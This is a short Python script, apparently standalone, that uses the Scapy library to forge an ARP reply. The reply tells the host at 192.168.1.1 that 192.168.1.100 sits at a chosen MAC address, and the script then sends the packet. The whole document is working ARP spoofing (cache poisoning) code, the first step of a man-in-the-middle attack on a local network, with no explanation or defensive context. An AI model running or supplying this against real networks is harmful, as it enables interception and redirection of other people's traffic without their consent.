from scapy.all import *

arp_spoof = ARP(op=2, pdst="192.168.1.1", psrc="192.168.1.100",hwsrc="00:11:22:33:44:55")

send(arp_spoof)